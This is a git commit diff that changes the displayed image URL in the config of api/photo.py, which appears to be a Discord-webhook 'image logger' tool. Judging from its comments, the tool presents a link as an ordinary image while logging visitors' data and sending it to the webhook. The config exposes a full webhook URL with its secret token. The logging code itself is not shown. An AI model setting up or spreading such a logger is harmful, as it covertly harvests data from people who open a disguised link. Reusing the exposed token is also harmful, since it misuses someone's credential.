f96a1f88add5eaa57df8a1054cf6bea7c0456d98
Xval4k <vaseanuhuh20101@gmail.com>
2025-12-30 14:31:50 +0200

    Update image URL in photo.py configuration

--- api/photo.py
+++ api/photo.py
@@ -13,7 +13,7 @@ __author__ = "C00lB0i"
 config = {
     # BASE CONFIG #
     "webhook": "https://discord.com/api/webhooks/1446969452037013675/XgOHyn9_9QJAbijufs82bNOJcTcwrlunip2mbPeovea2PnrVQr8BcXH6H_g92FuximCa",
-    "image": "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTDzrphqqA9gDVLWDsZX2gcnDXb5sYoLDpQy76FTbr2ew&s=10", # You can also have a custom image by using a URL argument
+    "image": "https://tenor.com/view/dexter-james-doakes-surprise-mf-can%27t-prove-it-gif-7408854170742055240", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
